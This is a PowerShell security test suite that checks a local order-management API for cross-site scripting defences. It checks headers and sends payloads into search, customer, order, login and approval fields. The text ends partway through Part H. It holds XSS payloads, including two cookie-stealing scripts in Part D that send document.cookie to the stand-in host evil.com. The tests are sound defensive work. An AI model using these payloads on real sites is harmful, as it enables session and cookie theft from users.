# ================================================================
# TEST-SEC-011: XSS Prevention - Kiem tra chong tan cong XSS
# Severity: CRITICAL
#
# Steps:
#   A. Security Headers (CSP, X-Frame-Options, nosniff, etc.)
#   B. Script tag injection in search queries
#   C. XSS in form inputs - Customer name/company
#   D. XSS in order notes/remarks
#   E. XSS in URL fields (javascript:, data:)
#   F. XSS via various payloads in text fields
#   G. XSS in login/auth fields (reflected XSS)
#   H. Stored XSS via approval comments
#   I. DOM-based XSS vectors (encoded entities, unicode)
#   J. Content-Type enforcement
#
# Expected: ~42 tests
# ================================================================

$ErrorActionPreference = 'Continue'
$BASE_URL = "http://localhost:3001/api/v1"
$DOMAIN = "nhaphangchinhngach.vn"

$passCount = 0
$failCount = 0
$warnCount = 0

function Api($method, $path, $token, $body) {
    $uri = "$BASE_URL$path"
    $params = @{ Uri = $uri; Method = $method; ContentType = "application/json" }
    if ($token) { $params.Headers = @{ "Authorization" = "Bearer $token" } }
    if ($body)  { $params.Body = ($body | ConvertTo-Json -Depth 10 -Compress) }
    try {
        return Invoke-RestMethod @params
    } catch {
        $code = 0; $errBody = ""
        try {
            $resp = $_.Exception.Response
            $code = [int]$resp.StatusCode
            $stream = $resp.GetResponseStream()
            $stream.Position = 0
            $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
            $errBody = $reader.ReadToEnd()
            $reader.Close()
        } catch { try { $code = [int]$_.Exception.Response.StatusCode } catch {} }
        Write-Host "    API ERROR: $method $path -> $code : $errBody" -ForegroundColor DarkRed
        return $null
    }
}

function Api-Expect($method, $path, $token, $body) {
    $uri = "$BASE_URL$path"
    $params = @{
        Uri    = $uri
        Method = $method
        Headers = @{ "Content-Type" = "application/json" }
    }
    if ($token) { $params.Headers["Authorization"] = "Bearer $token" }
    if ($body)  { $params.Body = ($body | ConvertTo-Json -Depth 10 -Compress) }
    try {
        $r = Invoke-WebRequest @params -UseBasicParsing
        $parsed = $null
        try { $parsed = $r.Content | ConvertFrom-Json } catch {}
        return @{ code = [int]$r.StatusCode; body = $parsed; error = $null; headers = $r.Headers; rawContent = $r.Content }
    } catch {
        $code = 0; $errBody = ""; $parsed = $null; $headers = $null
        try {
            $resp = $_.Exception.Response
            $code = [int]$resp.StatusCode
            $stream = $resp.GetResponseStream()
            $stream.Position = 0
            $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
            $errBody = $reader.ReadToEnd()
            $reader.Close()
            $headers = @{}
            foreach ($key in $resp.Headers.AllKeys) { $headers[$key] = $resp.Headers[$key] }
        } catch { try { $code = [int]$_.Exception.Response.StatusCode } catch {} }
        if ($errBody) { try { $parsed = $errBody | ConvertFrom-Json } catch {} }
        return @{ code = $code; body = $parsed; error = $errBody; headers = $headers; rawContent = $errBody }
    }
}

function D($resp) {
    if ($resp -and $resp.data) { return $resp.data }
    return $resp
}

function Login($email) {
    $body = @{ email = $email; password = "Admin@123" } | ConvertTo-Json
    try {
        $r = Invoke-RestMethod -Uri "$BASE_URL/auth/login" -Method POST -Body $body -ContentType "application/json"
        $token = $r.data.tokens.accessToken
        if (-not $token) { $token = $r.data.accessToken }
        if (-not $token) { $token = $r.accessToken }
        return $token
    } catch {
        Write-Host "  LOGIN FAILED: $email - $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

function Pass($msg) { $script:passCount++; Write-Host "[PASS] $msg" -ForegroundColor Green }
function Fail($msg) { $script:failCount++; Write-Host "[FAIL] $msg" -ForegroundColor Red }
function Warn($msg) { $script:warnCount++; Write-Host "[WARN] $msg" -ForegroundColor Yellow }

# Helper: Check if raw content contains unescaped script tag
function Has-RawScript($content) {
    if (-not $content) { return $false }
    $str = [string]$content
    # Check for unescaped <script> (not &lt;script&gt; or literal JSON-escaped)
    return ($str -match '<script[^>]*>' -and $str -notmatch '&lt;script')
}

# Helper: Check if raw content contains unescaped event handler HTML
function Has-RawEventHandler($content) {
    if (-not $content) { return $false }
    $str = [string]$content
    return ($str -match '<(img|svg|div|body|input|iframe)\s[^>]*(onerror|onload|onmouseover|onfocus|src\s*=\s*[''"]?javascript:)[^>]*>')
}

# Helper: Get error message from response for debugging
function Get-ErrorMsg($response) {
    if ($response.body -and $response.body.message) {
        if ($response.body.message -is [array]) {
            return ($response.body.message -join " | ")
        }
        return [string]$response.body.message
    }
    if ($response.error) {
        $maxLen = [math]::Min(200, $response.error.Length)
        return $response.error.Substring(0, $maxLen)
    }
    return "(no message)"
}

Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  TEST-SEC-011: XSS Prevention - Chong tan cong Cross-Site Scripting" -ForegroundColor Cyan
Write-Host "  Severity: CRITICAL" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

# ================================================================
# SETUP
# ================================================================
Write-Host ""
Write-Host "=== SETUP: Login ===" -ForegroundColor White

$ADMIN = Login "admin@$DOMAIN"
if ($ADMIN) { Pass "SETUP: Admin login OK" } else { Fail "SETUP: Admin login FAILED"; exit 1 }

$SALE = Login "sale01@$DOMAIN"
if ($SALE) { Pass "SETUP: Sale login OK" } else { Fail "SETUP: Sale login FAILED"; exit 1 }

# Get a customer ID for testing
$custList = Api "GET" "/customers?limit=5" $SALE
$CUST_ID = $null
if ($custList -and $custList.data) {
    $items = $null
    if ($custList.data -is [array]) { $items = $custList.data }
    elseif ($custList.data.data) { $items = $custList.data.data }
    elseif ($custList.data.items) { $items = $custList.data.items }
    if ($items -and $items.Count -gt 0) {
        $CUST_ID = $items[0].id
        Write-Host "  Using customer: $($items[0].code) ($($items[0].fullName))" -ForegroundColor Gray
    }
}
if (-not $CUST_ID) {
    Write-Host "  No customer found, some tests will be skipped" -ForegroundColor Yellow
}

# Get an order ID for testing
$ordList = Api "GET" "/orders?limit=5" $SALE
$ORD_ID = $null
if ($ordList -and $ordList.data) {
    $items = $null
    if ($ordList.data -is [array]) { $items = $ordList.data }
    elseif ($ordList.data.data) { $items = $ordList.data.data }
    elseif ($ordList.data.items) { $items = $ordList.data.items }
    if ($items -and $items.Count -gt 0) {
        $ORD_ID = $items[0].id
        Write-Host "  Using order: $($items[0].code)" -ForegroundColor Gray
    }
}
if (-not $ORD_ID) {
    Write-Host "  No order found, some tests will be skipped" -ForegroundColor Yellow
}

# Get an approval ID for testing comments
$apprList = Api "GET" "/approvals?limit=5" $ADMIN
$APPR_ID = $null
if ($apprList -and $apprList.data) {
    $items = $null
    if ($apprList.data -is [array]) { $items = $apprList.data }
    elseif ($apprList.data.data) { $items = $apprList.data.data }
    elseif ($apprList.data.items) { $items = $apprList.data.items }
    if ($items -and $items.Count -gt 0) {
        $APPR_ID = $items[0].id
        Write-Host "  Using approval: $APPR_ID" -ForegroundColor Gray
    }
}
if (-not $APPR_ID) {
    Write-Host "  No approval found, some tests will be skipped" -ForegroundColor Yellow
}

# ================================================================
# PART A: Security Headers (~6 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART A: Security Headers" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

Write-Host ""
Write-Host "=== TEST A1: Content-Security-Policy header ===" -ForegroundColor White
$r = Api-Expect "GET" "/orders?limit=1" $SALE
if ($r.headers) {
    $csp = $null
    foreach ($key in $r.headers.Keys) {
        if ($key -ieq "Content-Security-Policy") { $csp = $r.headers[$key]; break }
    }
    if ($csp) {
        Pass "A1: Content-Security-Policy header present: $($csp.Substring(0, [math]::Min(80, $csp.Length)))..."
    } else {
        Warn "A1: Content-Security-Policy header not found (helmet may set it differently)"
    }
} else {
    Warn "A1: Could not read response headers"
}

Write-Host ""
Write-Host "=== TEST A2: X-Content-Type-Options: nosniff ===" -ForegroundColor White
if ($r.headers) {
    $nosniff = $null
    foreach ($key in $r.headers.Keys) {
        if ($key -ieq "X-Content-Type-Options") { $nosniff = $r.headers[$key]; break }
    }
    if ($nosniff -and $nosniff -match "nosniff") {
        Pass "A2: X-Content-Type-Options: nosniff present"
    } else {
        Fail "A2: X-Content-Type-Options: nosniff missing (MIME sniffing attack possible)"
    }
} else {
    Fail "A2: Could not read response headers"
}

Write-Host ""
Write-Host "=== TEST A3: X-Frame-Options ===" -ForegroundColor White
if ($r.headers) {
    $xfo = $null
    foreach ($key in $r.headers.Keys) {
        if ($key -ieq "X-Frame-Options") { $xfo = $r.headers[$key]; break }
    }
    if ($xfo -and ($xfo -match "DENY" -or $xfo -match "SAMEORIGIN")) {
        Pass "A3: X-Frame-Options present: $xfo"
    } else {
        Fail "A3: X-Frame-Options missing (clickjacking attack possible)"
    }
} else {
    Fail "A3: Could not read response headers"
}

Write-Host ""
Write-Host "=== TEST A4: X-XSS-Protection header ===" -ForegroundColor White
if ($r.headers) {
    $xss = $null
    foreach ($key in $r.headers.Keys) {
        if ($key -ieq "X-XSS-Protection") { $xss = $r.headers[$key]; break }
    }
    if ($xss) {
        Pass "A4: X-XSS-Protection header present: $xss"
    } else {
        # Helmet v5+ sets X-XSS-Protection: 0 (disable browser XSS filter, CSP is better)
        Warn "A4: X-XSS-Protection not found (helmet v5 disables it, CSP is preferred)"
    }
} else {
    Warn "A4: Could not read response headers"
}

Write-Host ""
Write-Host "=== TEST A5: Strict-Transport-Security (HSTS) ===" -ForegroundColor White
if ($r.headers) {
    $hsts = $null
    foreach ($key in $r.headers.Keys) {
        if ($key -ieq "Strict-Transport-Security") { $hsts = $r.headers[$key]; break }
    }
    if ($hsts) {
        Pass "A5: Strict-Transport-Security present: $hsts"
    } else {
        Warn "A5: HSTS not found (expected in production, may not be set in dev/localhost)"
    }
} else {
    Warn "A5: Could not read response headers"
}

Write-Host ""
Write-Host "=== TEST A6: Content-Type is application/json ===" -ForegroundColor White
if ($r.headers) {
    $ct = $null
    foreach ($key in $r.headers.Keys) {
        if ($key -ieq "Content-Type") { $ct = $r.headers[$key]; break }
    }
    if ($ct -and $ct -match "application/json") {
        Pass "A6: Content-Type is application/json (prevents script execution in browser)"
    } elseif ($ct -and $ct -match "text/html") {
        Fail "A6: Content-Type is text/html - XSS can execute in browser!"
    } else {
        Warn "A6: Content-Type is '$ct' (expected application/json)"
    }
} else {
    Fail "A6: Could not read response headers"
}

# ================================================================
# PART B: Script tag injection in search (~4 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART B: Script tag injection in search queries" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

Write-Host ""
Write-Host "=== TEST B1: Script tag in order search ===" -ForegroundColor White
$xssSearch = [System.Uri]::EscapeDataString("<script>alert('xss')</script>")
$r = Api-Expect "GET" "/orders?search=$xssSearch" $SALE
Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
if ($r.code -ge 200 -and $r.code -lt 300) {
    if (Has-RawScript $r.rawContent) {
        Fail "B1: Response contains unescaped <script> tag - reflected XSS!"
    } else {
        Pass "B1: Script tag in search query - response safe (no raw <script>)"
    }
} elseif ($r.code -eq 400) {
    Pass "B1: Script tag in search query rejected (400)"
} else {
    Warn "B1: Unexpected response code $($r.code)"
}

Write-Host ""
Write-Host "=== TEST B2: IMG onerror in customer search ===" -ForegroundColor White
$xssImg = [System.Uri]::EscapeDataString("<img src=x onerror=alert(1)>")
$r = Api-Expect "GET" "/customers?search=$xssImg" $SALE
Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
if ($r.code -ge 200 -and $r.code -lt 300) {
    if (Has-RawEventHandler $r.rawContent) {
        Fail "B2: Response contains unescaped <img onerror> - reflected XSS!"
    } else {
        Pass "B2: IMG onerror in search - response safe"
    }
} elseif ($r.code -eq 400) {
    Pass "B2: IMG onerror in search rejected (400)"
} else {
    Warn "B2: Unexpected response code $($r.code)"
}

Write-Host ""
Write-Host "=== TEST B3: SVG onload in order search ===" -ForegroundColor White
$xssSvg = [System.Uri]::EscapeDataString("<svg/onload=alert(1)>")
$r = Api-Expect "GET" "/orders?search=$xssSvg" $SALE
Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
if ($r.code -ge 200 -and $r.code -lt 300) {
    if ($r.rawContent -match '<svg[^>]*onload') {
        Fail "B3: Response contains unescaped <svg onload> - reflected XSS!"
    } else {
        Pass "B3: SVG onload in search - response safe"
    }
} elseif ($r.code -eq 400) {
    Pass "B3: SVG onload in search rejected (400)"
} else {
    Warn "B3: Unexpected response code $($r.code)"
}

Write-Host ""
Write-Host "=== TEST B4: Search results are safe (empty or literal) ===" -ForegroundColor White
# Verify search with XSS returns empty results (no match), not rendered HTML
$r = Api-Expect "GET" "/orders?search=$xssSearch" $SALE
if ($r.code -ge 200 -and $r.code -lt 300) {
    $ct = $null
    if ($r.headers) {
        foreach ($key in $r.headers.Keys) {
            if ($key -ieq "Content-Type") { $ct = $r.headers[$key]; break }
        }
    }
    if ($ct -and $ct -match "application/json") {
        Pass "B4: XSS search result returned as JSON (safe content type)"
    } else {
        Warn "B4: Search result content type: $ct (expected application/json)"
    }
} else {
    Pass "B4: XSS search rejected by server"
}

# ================================================================
# PART C: XSS in form inputs - Customer name (~5 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART C: XSS in Customer form fields" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

if ($CUST_ID) {
    Write-Host ""
    Write-Host "=== TEST C1: Read customer baseline ===" -ForegroundColor White
    $custOrig = D (Api "GET" "/customers/$CUST_ID" $SALE)
    if ($custOrig -and $custOrig.id) {
        Pass "C1: Customer baseline read OK ($($custOrig.fullName))"
    } else {
        Warn "C1: Could not read customer baseline"
    }

    Write-Host ""
    Write-Host "=== TEST C2: Script tag in customer fullName ===" -ForegroundColor White
    $xssName = "<script>alert('xss')</script>"
    $r = Api-Expect "PATCH" "/customers/$CUST_ID" $SALE @{ fullName = $xssName }
    Write-Host "  HTTP $($r.code) | $(Get-ErrorMsg $r)" -ForegroundColor Gray
    if ($r.code -eq 400) {
        Pass "C2: XSS in fullName rejected (400 - input validation)"
    } elseif ($r.code -ge 200 -and $r.code -lt 300) {
        # Check if stored value is sanitized
        $readBack = D (Api "GET" "/customers/$CUST_ID" $SALE)
        if ($readBack -and $readBack.fullName) {
            if ($readBack.fullName -match '<script[^>]*>') {
                Warn "C2: XSS stored literally in fullName (JSON API - browser won't execute, but risky if rendered in HTML)"
            } else {
                Pass "C2: XSS in fullName was sanitized/stripped on storage"
            }
        } else {
            Warn "C2: Could not read back customer after XSS update"
        }
    } else {
        Warn "C2: Unexpected response $($r.code)"
    }

    Write-Host ""
    Write-Host "=== TEST C3: Read back customer after XSS attempt ===" -ForegroundColor White
    $readBack = D (Api "GET" "/customers/$CUST_ID" $SALE)
    if ($readBack -and $readBack.fullName) {
        if ($readBack.fullName -match '<script[^>]*>') {
            Warn "C3: fullName contains raw <script> (stored XSS - WARN because JSON response)"
        } else {
            Pass "C3: fullName does NOT contain raw <script> tag"
        }
    } else {
        Warn "C3: Could not read customer"
    }

    Write-Host ""
    Write-Host "=== TEST C4: IMG onerror in companyName ===" -ForegroundColor White
    $xssCompany = "<img src=x onerror=alert(document.cookie)>"
    $r = Api-Expect "PATCH" "/customers/$CUST_ID" $SALE @{ companyName = $xssCompany }
    Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
    if ($r.code -eq 400) {
        Pass "C4: XSS in companyName rejected (400)"
    } elseif ($r.code -ge 200 -and $r.code -lt 300) {
        $readBack = D (Api "GET" "/customers/$CUST_ID" $SALE)
        if ($readBack -and $readBack.companyName -match '<img[^>]*onerror') {
            Warn "C4: IMG onerror stored in companyName (JSON API - WARN)"
        } else {
            Pass "C4: IMG onerror sanitized/stripped in companyName"
        }
    } else {
        Warn "C4: Unexpected response $($r.code)"
    }

    Write-Host ""
    Write-Host "=== TEST C5: Iframe in note field ===" -ForegroundColor White
    $xssNote = "<iframe src='javascript:alert(1)'></iframe>"
    $r = Api-Expect "PATCH" "/customers/$CUST_ID" $SALE @{ note = $xssNote }
    Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
    if ($r.code -eq 400) {
        Pass "C5: XSS in note rejected (400)"
    } elseif ($r.code -ge 200 -and $r.code -lt 300) {
        $readBack = D (Api "GET" "/customers/$CUST_ID" $SALE)
        if ($readBack -and $readBack.note -match '<iframe[^>]*javascript:') {
            Warn "C5: Iframe/javascript stored in note (JSON API - WARN)"
        } else {
            Pass "C5: Iframe/javascript sanitized in note"
        }
    } else {
        Warn "C5: Unexpected response $($r.code)"
    }

    # Restore customer name if it was changed
    if ($custOrig -and $custOrig.fullName) {
        Api "PATCH" "/customers/$CUST_ID" $SALE @{
            fullName    = $custOrig.fullName
            companyName = if ($custOrig.companyName) { $custOrig.companyName } else { "" }
            note        = if ($custOrig.note) { $custOrig.note } else { "" }
        } | Out-Null
    }
} else {
    Warn "C1: Skipped - no customer found"
    Warn "C2: Skipped - no customer found"
    Warn "C3: Skipped - no customer found"
    Warn "C4: Skipped - no customer found"
    Warn "C5: Skipped - no customer found"
}

# ================================================================
# PART D: XSS in order notes/remarks (~4 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART D: XSS in order notes/remarks" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

if ($ORD_ID) {
    Write-Host ""
    Write-Host "=== TEST D1: Script tag with cookie theft in order note ===" -ForegroundColor White
    $xssPayload1 = "Ghi chu <script>document.location='http://evil.com/?c='+document.cookie</script>"
    $r = Api-Expect "PATCH" "/orders/$ORD_ID" $SALE @{ note = $xssPayload1 }
    Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
    if ($r.code -eq 400) {
        Pass "D1: XSS in order note rejected (400)"
    } elseif ($r.code -ge 200 -and $r.code -lt 300) {
        $readBack = D (Api "GET" "/orders/$ORD_ID" $SALE)
        if ($readBack -and $readBack.note -match '<script[^>]*>') {
            Warn "D1: Script tag stored in order note (JSON API - WARN)"
        } else {
            Pass "D1: Script tag sanitized/stripped in order note"
        }
    } else {
        Warn "D1: Unexpected response $($r.code)"
    }

    Write-Host ""
    Write-Host "=== TEST D2: Cookie-stealing script payload ===" -ForegroundColor White
    $xssPayload2 = "<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>"
    $r = Api-Expect "PATCH" "/orders/$ORD_ID" $SALE @{ note = $xssPayload2 }
    Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
    if ($r.code -eq 400) {
        Pass "D2: Cookie-steal script in order note rejected (400)"
    } elseif ($r.code -ge 200 -and $r.code -lt 300) {
        $readBack = D (Api "GET" "/orders/$ORD_ID" $SALE)
        if ($readBack -and $readBack.note -match '<script[^>]*>') {
            Warn "D2: Script stored in order note (JSON API - WARN, dangerous if rendered in HTML)"
        } else {
            Pass "D2: Script sanitized/stripped in order note"
        }
    } else {
        Warn "D2: Unexpected response $($r.code)"
    }

    Write-Host ""
    Write-Host "=== TEST D3: Event handler payload in order note ===" -ForegroundColor White
    $xssPayload3 = "<div onmouseover=alert(1)>hover me</div>"
    $r = Api-Expect "PATCH" "/orders/$ORD_ID" $SALE @{ note = $xssPayload3 }
    Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
    if ($r.code -eq 400) {
        Pass "D3: Event handler in order note rejected (400)"
    } elseif ($r.code -ge 200 -and $r.code -lt 300) {
        $readBack = D (Api "GET" "/orders/$ORD_ID" $SALE)
        if ($readBack -and $readBack.note -match '<div[^>]*onmouseover') {
            Warn "D3: Event handler stored in order note (JSON API - WARN)"
        } else {
            Pass "D3: Event handler sanitized in order note"
        }
    } else {
        Warn "D3: Unexpected response $($r.code)"
    }

    Write-Host ""
    Write-Host "=== TEST D4: Read back order data - verify no raw HTML ===" -ForegroundColor White
    $r = Api-Expect "GET" "/orders/$ORD_ID" $SALE
    if ($r.code -ge 200 -and $r.code -lt 300) {
        $ct = $null
        if ($r.headers) {
            foreach ($key in $r.headers.Keys) {
                if ($key -ieq "Content-Type") { $ct = $r.headers[$key]; break }
            }
        }
        if ($ct -and $ct -match "application/json") {
            Pass "D4: Order data returned as JSON (mitigates XSS execution)"
        } else {
            Fail "D4: Order data returned as $ct - XSS could execute!"
        }
    } else {
        Warn "D4: Could not read order ($($r.code))"
    }
} else {
    Warn "D1: Skipped - no order found"
    Warn "D2: Skipped - no order found"
    Warn "D3: Skipped - no order found"
    Warn "D4: Skipped - no order found"
}

# ================================================================
# PART E: XSS in URL fields (~4 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART E: XSS in URL fields" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

Write-Host ""
Write-Host "=== TEST E1: javascript: protocol in imageUrls ===" -ForegroundColor White
$r = Api-Expect "POST" "/warehouse-cn/receive" $ADMIN @{
    trackingNumberCN = "XSS-TEST-E1-JS"
    orderId          = if ($ORD_ID) { $ORD_ID } else { "fake-order-id" }
    imageUrls        = @("javascript:alert(1)")
}
Write-Host "  HTTP $($r.code) | $(Get-ErrorMsg $r)" -ForegroundColor Gray
if ($r.code -eq 400) {
    Pass "E1: javascript: protocol in imageUrls rejected (400)"
} elseif ($r.code -eq 403) {
    Pass "E1: Request rejected due to role/permission (403) - URL not tested, but access blocked"
} elseif ($r.code -ge 200 -and $r.code -lt 300) {
    Warn "E1: javascript: URL accepted (stored XSS risk if rendered as img src)"
} else {
    Warn "E1: Response $($r.code) - $(Get-ErrorMsg $r)"
}

Write-Host ""
Write-Host "=== TEST E2: data: URI with script in imageUrls ===" -ForegroundColor White
$r = Api-Expect "POST" "/warehouse-cn/receive" $ADMIN @{
    trackingNumberCN = "XSS-TEST-E2-DATA"
    orderId          = if ($ORD_ID) { $ORD_ID } else { "fake-order-id" }
    imageUrls        = @("data:text/html,<script>alert(1)</script>")
}
Write-Host "  HTTP $($r.code) | $(Get-ErrorMsg $r)" -ForegroundColor Gray
if ($r.code -eq 400) {
    Pass "E2: data: URI in imageUrls rejected (400)"
} elseif ($r.code -eq 403) {
    Pass "E2: Request rejected (403) - access blocked"
} elseif ($r.code -ge 200 -and $r.code -lt 300) {
    Warn "E2: data: URI accepted (potential stored XSS if rendered)"
} else {
    Warn "E2: Response $($r.code) - $(Get-ErrorMsg $r)"
}

Write-Host ""
Write-Host "=== TEST E3: URL with injected HTML attribute ===" -ForegroundColor White
$r = Api-Expect "POST" "/warehouse-cn/receive" $ADMIN @{
    trackingNumberCN = "XSS-TEST-E3-ATTR"
    orderId          = if ($ORD_ID) { $ORD_ID } else { "fake-order-id" }
    imageUrls        = @("https://evil.com/img.jpg`" onerror=`"alert(1)")
}
Write-Host "  HTTP $($r.code) | $(Get-ErrorMsg $r)" -ForegroundColor Gray
if ($r.code -eq 400) {
    Pass "E3: URL with HTML injection rejected (400)"
} elseif ($r.code -eq 403) {
    Pass "E3: Request rejected (403)"
} elseif ($r.code -ge 200 -and $r.code -lt 300) {
    # JSON stores literal string, so onerror can't execute in JSON context
    Pass "E3: URL stored literally in JSON (safe in JSON response context)"
} else {
    Warn "E3: Response $($r.code) - $(Get-ErrorMsg $r)"
}

Write-Host ""
Write-Host "=== TEST E4: Valid URL should work ===" -ForegroundColor White
$r = Api-Expect "POST" "/warehouse-cn/receive" $ADMIN @{
    trackingNumberCN = "XSS-TEST-E4-VALID"
    orderId          = if ($ORD_ID) { $ORD_ID } else { "fake-order-id" }
    imageUrls        = @("https://storage.example.com/valid-image.jpg")
}
Write-Host "  HTTP $($r.code) | $(Get-ErrorMsg $r)" -ForegroundColor Gray
if ($r.code -ge 200 -and $r.code -lt 300) {
    Pass "E4: Valid HTTPS URL accepted"
} elseif ($r.code -eq 400 -or $r.code -eq 404) {
    # May fail due to invalid orderId, not URL
    if ($r.rawContent -match "order|Order|not found") {
        Pass "E4: Valid URL format OK (failed due to order not found, not URL)"
    } else {
        Warn "E4: Valid URL rejected ($($r.code)) - $(Get-ErrorMsg $r)"
    }
} elseif ($r.code -eq 403) {
    Warn "E4: Access denied (403) - cannot test URL validation with this role"
} else {
    Warn "E4: Unexpected response $($r.code)"
}

# ================================================================
# PART F: XSS via various payloads in text fields (~6 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART F: Various XSS payloads in text fields" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

# We test these payloads against the complaint description field (which accepts long text)
$xssPayloads = @(
    @{ tag = "F1"; payload = "<svg><script>alert(1)</script></svg>"; desc = "SVG with nested script" }
    @{ tag = "F2"; payload = "<<script>script>alert(1)<</script>/script>"; desc = "Nested/broken script tags" }
    @{ tag = "F3"; payload = "<body onload=alert(1)>"; desc = "Body onload event" }
    @{ tag = "F4"; payload = "<input type=text value='' onfocus=alert(1) autofocus>"; desc = "Input onfocus autofocus" }
    @{ tag = "F5"; payload = "{{constructor.constructor('alert(1)')()}}"; desc = "Template injection" }
    @{ tag = "F6"; payload = "`${7*7}"; desc = "Template literal injection" }
)

foreach ($xss in $xssPayloads) {
    Write-Host ""
    Write-Host "=== TEST $($xss.tag): $($xss.desc) ===" -ForegroundColor White

    if ($CUST_ID -and $ORD_ID) {
        # Try via complaint description (accepts long text)
        $r = Api-Expect "POST" "/complaints" $SALE @{
            orderId     = $ORD_ID
            customerId  = $CUST_ID
            type        = "DAMAGE"
            severity    = "MEDIUM"
            description = "XSS test payload: $($xss.payload) - padding to meet minimum length requirement"
        }
        Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
        if ($r.code -eq 400) {
            Pass "$($xss.tag): XSS payload rejected by input validation (400)"
        } elseif ($r.code -ge 200 -and $r.code -lt 300) {
            # Check if the response body is JSON (safe)
            $ct = $null
            if ($r.headers) {
                foreach ($key in $r.headers.Keys) {
                    if ($key -ieq "Content-Type") { $ct = $r.headers[$key]; break }
                }
            }
            if ($ct -and $ct -match "application/json") {
                # Stored but returned as JSON - check if sanitized
                if ($r.rawContent -match '<script[^>]*>' -or $r.rawContent -match 'onload\s*=' -or $r.rawContent -match 'onfocus\s*=') {
                    Warn "$($xss.tag): Payload stored literally (JSON response - browser safe, but risky if rendered as HTML)"
                } else {
                    Pass "$($xss.tag): Payload appears sanitized/safe in response"
                }
            } else {
                Fail "$($xss.tag): Response type is $ct - stored XSS could execute!"
            }
        } elseif ($r.code -eq 403 -or $r.code -eq 404) {
            Warn "$($xss.tag): Could not test ($($r.code) - access/data issue, not XSS related)"
        } else {
            Warn "$($xss.tag): Unexpected response $($r.code)"
        }
    } else {
        # Fallback: test via customer note update
        if ($CUST_ID) {
            $r = Api-Expect "PATCH" "/customers/$CUST_ID" $SALE @{ note = "XSS: $($xss.payload) padding text" }
            Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
            if ($r.code -eq 400) {
                Pass "$($xss.tag): XSS payload rejected (400)"
            } elseif ($r.code -ge 200 -and $r.code -lt 300) {
                Warn "$($xss.tag): Payload accepted and stored (JSON response mitigates execution)"
            } else {
                Warn "$($xss.tag): Unexpected response $($r.code)"
            }
        } else {
            Warn "$($xss.tag): Skipped - no customer/order available"
        }
    }
}

# ================================================================
# PART G: XSS in login/auth fields (~3 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART G: XSS in login/auth fields (reflected XSS)" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

Write-Host ""
Write-Host "=== TEST G1: Script tag in email field ===" -ForegroundColor White
$r = Api-Expect "POST" "/auth/login" $null @{
    email    = "<script>alert(1)</script>@test.com"
    password = "test"
}
Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
if ($r.code -eq 400 -or $r.code -eq 401) {
    # Check if the error response reflects the XSS payload
    if ($r.rawContent -and $r.rawContent -match '<script[^>]*>alert\(1\)</script>') {
        Fail "G1: Error response reflects unsanitized script tag - reflected XSS!"
    } else {
        Pass "G1: Login with XSS email - error response does NOT reflect raw script"
    }
} else {
    Warn "G1: Unexpected response $($r.code)"
}

Write-Host ""
Write-Host "=== TEST G2: Script tag in password field ===" -ForegroundColor White
$r = Api-Expect "POST" "/auth/login" $null @{
    email    = "test@test.com"
    password = "<script>alert(1)</script>"
}
Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
if ($r.code -eq 400 -or $r.code -eq 401) {
    if ($r.rawContent -and $r.rawContent -match '<script[^>]*>alert\(1\)</script>') {
        Fail "G2: Error response reflects unsanitized password - reflected XSS!"
    } else {
        Pass "G2: Login with XSS password - error response safe"
    }
} else {
    Warn "G2: Unexpected response $($r.code)"
}

Write-Host ""
Write-Host "=== TEST G3: Error message does not contain raw input ===" -ForegroundColor White
$xssEmail = "<img src=x onerror=alert(1)>@evil.com"
$r = Api-Expect "POST" "/auth/login" $null @{
    email    = $xssEmail
    password = "anything"
}
Write-Host "  HTTP $($r.code)" -ForegroundColor Gray
if ($r.rawContent -and $r.rawContent -match '<img[^>]*onerror') {
    Fail "G3: Error message contains raw XSS input - reflected XSS vulnerability!"
} else {
    Pass "G3: Error message does NOT contain raw XSS input (no reflection)"
}

# ================================================================
# PART H: Stored XSS via approval comments (~4 tests)
# ================================================================
Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  PART H: Stored XSS via approval comments" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan

if ($APPR_ID) {
    Write-Host ""
    Write-Host "=== TEST H1: Post comment with script tag ===" -ForegroundColor White
    $xssComment = "<script>alert('stored-xss')</script>"
    $r = Api-Expect "POST" "/approvals/$APPR_ID/comments" $ADMIN @{
        content = $xssComment
    }
    Write-Host "  HTTP $($r.code) | $(Get-ErrorMsg $r)" -ForegroundColor Gray
    if ($r.code -eq 400) {
        Pass "H1: XSS in comment rejected (400 - input validation)"
